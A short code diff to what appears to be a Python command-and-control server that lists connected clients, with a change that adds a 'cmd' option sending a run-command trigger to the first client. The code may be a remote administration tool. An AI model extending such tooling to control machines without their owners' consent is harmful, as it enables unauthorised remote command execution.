@@ -71,7 +71,9 @@ threading.Thread(target=ThreadStartServer).start()
 
 time.sleep(1)
 
-print("Available commands:\n  list: Lists down available clients.\n")
+print("""Available commands:\n
+  list: Lists down available clients.\n
+  cmd: Run command on client.\n""")
 
 while True:
     command = input(">> ")
@@ -82,6 +84,8 @@ while True:
                 print("Client " + str(i) + ": " + c.info + "\n")
         else:
             print("No available clients.\n")
+    elif command.startswith("cmd"):
+        clients[0].connection.send(b"cmd")
     elif command.startswith("shutdown"):
         commandSplitted = command.strip().split(" ")
         if len(commandSplitted) > 1:
